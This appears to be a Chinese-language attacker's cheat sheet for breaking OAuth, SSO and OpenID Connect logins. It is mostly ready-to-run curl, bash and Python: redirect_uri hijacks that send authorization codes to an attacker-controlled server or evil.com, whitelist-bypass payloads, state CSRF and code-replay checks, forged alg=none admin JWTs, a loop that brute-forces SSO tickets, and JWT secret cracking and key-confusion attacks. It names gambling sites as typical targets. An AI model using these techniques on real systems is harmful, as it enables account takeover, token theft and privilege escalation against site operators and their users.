## 0. 快速识别

| 信号 | 含义 |
|------|------|
| URL 含 `?code=` / `?state=` / `#access_token=` | OAuth 授权码流 / 隐式流 |
| 登录跳转 `response_type=code` | Authorization Code 流 |
| `client_id` / `redirect_uri` 参数 | OAuth 客户端配置 |
| `/oauth/authorize` · `/auth/login` · `/sso/` | 统一登录入口 |
| Cookie: `sso_token` / `id_token` | SSO session |
| JWT payload: `iss` (issuer) 指向外部域 | 第三方 IdP |

## 1. redirect_uri 劫持（最常见）

服务端校验 `redirect_uri` 不严格时，把回调改到自控域，授权码直接发过来。

### 1.1 变体一：完全替换

```
正常:  /oauth/authorize?client_id=xxx&redirect_uri=https://目标/callback&response_type=code
攻击:  /oauth/authorize?client_id=xxx&redirect_uri=https://你的服务器.com/steal&response_type=code
```

若受害者点击此链接 → 授权后 `code` 发到攻击者服务器 → 用 code 换 Token。

### 1.2 变体二：路径遍历绕过白名单

```
# 白名单: https://目标/callback
# 绕过:
redirect_uri=https://目标/callback/../../../steal
redirect_uri=https://目标.evil.com              # 如果只检查前缀
redirect_uri=https://目标/callback?x=https://evil.com   # 参数注入
redirect_uri=https://目标/callback%40evil.com   # @ 编码
```

### 1.3 测试命令

```bash
# 直接替换 redirect_uri
OAUTH_BASE="https://目标/oauth/authorize"
CLIENT_ID="web_client"
YOUR_SERVER="https://你的服务器/catch"

curl -v "$OAUTH_BASE?client_id=$CLIENT_ID&redirect_uri=$YOUR_SERVER&response_type=code&scope=openid"

# 监听（你的服务器）
python3 -m http.server 8888  # 或用 ngrok expose
```

## 2. state 参数 CSRF

`state` 参数应该是随机的，用于防 CSRF。如果服务端不校验，可以伪造授权。

```bash
# 1. 正常发起 OAuth 授权，拿一个有效 state
curl -v "https://目标/oauth/authorize?...&state=FIXED_VALUE"

# 2. 构造链接让受害者点击（管理员账号）
# 受害者点击后，其账号授权给 client_id，code 发到 redirect_uri
# 如果 redirect_uri 是你控制的，拿到 code 换 token

# 3. 验证 state 是否校验
# 改 state=任意值 → 如果还能完成授权 → state 未校验，存在 CSRF
```

## 3. 授权码重放与 code 泄露

```bash
# 3.1 code 是否可复用（换 token 后再换一次）
CODE="从URL拿到的code"
TOKEN_ENDPOINT="https://目标/oauth/token"

# 第一次换
curl -X POST "$TOKEN_ENDPOINT" \
  -d "grant_type=authorization_code&code=$CODE&client_id=xxx&redirect_uri=https://目标/callback"

# 第二次换（正常应该 400 invalid_grant）
curl -X POST "$TOKEN_ENDPOINT" \
  -d "grant_type=authorization_code&code=$CODE&client_id=xxx&redirect_uri=https://目标/callback"

# 3.2 Referer 头泄露 code
# 如果授权后页面有外链，Referer 里含 code → 第三方服务器能拿到 code
```

## 4. Token 越权（隐式流 / access_token 提权）

```bash
# 4.1 access_token 是否有范围限制（scope 越权）
# 用普通用户 token 调管理接口
TOKEN="eyJ..."
curl -H "Authorization: Bearer $TOKEN" \
  "https://目标/api/admin/users"   # 应该 403，如果 200 = 越权

# 4.2 token_hint 枚举
# 部分站 introspect 接口可查 token 归属
curl -X POST "https://目标/oauth/introspect" \
  -d "token=$TOKEN&token_hint=access_token"

# 4.3 JWT 无签名校验（alg=none）
python3 - <<'EOF'
import base64, json

# 构造 alg:none 的 JWT
header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode()
payload_data = {"sub":"admin","role":"admin","exp":9999999999}
payload = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).rstrip(b"=").decode()
fake_jwt = f"{header}.{payload}."  # 空签名
print("fake JWT:", fake_jwt)
EOF
```

## 5. SSO 统一登录票据伪造

博彩站常见：前台 H5 + 代理商后台 + 管理后台 走同一 SSO。

```bash
# 5.1 找 SSO ticket 参数名（常见: ticket / token / sso_token / cas_token）
# 登录成功后 URL: https://目标/callback?ticket=ST-1234-xxx

# 5.2 暴力猜 ticket（如果是短序列）
# ST-TIMESTAMP-RANDOM → 如果 RANDOM 短，可爆破
for i in $(seq 1000 9999); do
  TICKET="ST-$(date +%s)-$i"
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://目标/validate?ticket=$TICKET")
  [ "$CODE" = "200" ] && echo "HIT: $TICKET" && break
done

# 5.3 ticket 是否可在不同 service 间复用（service 参数伪造）
TICKET="ST-xxx-合法ticket"
curl "https://目标/validate?service=https://其他后台域名&ticket=$TICKET"
```

## 6. OpenID Connect / id_token 篡改

```python
# 如果 id_token 是 JWT，试 JWT 手法：密钥混淆 / alg=none / 弱密钥
# 参考: 传承/李代桃僵·星念.md

# HS256 密钥爆破
python3 炼蛊房/jwt_gql_probe.py crack \
  --token "eyJ..." \
  --wordlist /usr/share/wordlists/rockyou.txt

# RS256 → HS256 混淆攻击
# 把 alg 改 HS256，用服务器 RSA 公钥签名
python3 - <<'EOF'
import jwt, requests

# 获取公钥
pub_key = requests.get("https://目标/.well-known/jwks.json").json()["keys"][0]
# 从 JWK 提取 PEM，用它当 HS256 secret 签名 → 服务端可能用公钥验 HS256
EOF
```
